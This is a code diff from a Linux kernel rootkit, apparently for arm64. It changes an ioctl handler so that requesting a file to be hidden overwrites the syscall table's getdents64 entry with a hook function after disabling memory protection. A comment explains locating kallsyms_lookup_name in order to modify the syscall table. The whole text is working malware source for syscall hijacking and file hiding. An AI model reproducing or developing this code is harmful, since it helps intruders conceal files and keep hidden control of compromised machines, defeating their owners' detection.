@@ -49,6 +49,7 @@ static struct kprobe kp = {
 // 	.symbol_name = "sys_getdents64",
 // };
 
+// It can also find the address of sys_kill, but due to we need to modify the syscall table, so we need to find the address of kallsyms_lookup_name
 // static struct kprobe kp_kill = {
 // 	.symbol_name = "__arm64_sys_kill",
 // };
@@ -223,7 +224,6 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl, unsigned long a
 		// save the original syscall
 		orig_kill = (orgin_syscall)__sys_call_table[__NR_kill];
 		orig_reboot = (orgin_syscall)__sys_call_table[__NR_reboot];
-		orig_getdents64 = (orgin_syscall)__sys_call_table[__NR_getdents64];
 
 		// hook the sys call
 		unprotect_memory();
@@ -308,11 +308,16 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl, unsigned long a
 
 	case IOCTL_FILE_HIDE:
 	{
+		orig_getdents64 = (orgin_syscall)__sys_call_table[__NR_getdents64];
+		unprotect_memory();
+		__sys_call_table[__NR_getdents64] = (unsigned long)&hook_getdents64;
+		protect_memory();
 		// Copy the hided_file structure from user space
 		if (copy_from_user(&file_to_hide, (struct hided_file *)arg, sizeof(file_to_hide)))
 		{
 			return -EFAULT;
 		}
+
 		printk(KERN_INFO "File to hide: %s\n", file_to_hide.name);
 		break;
 	}
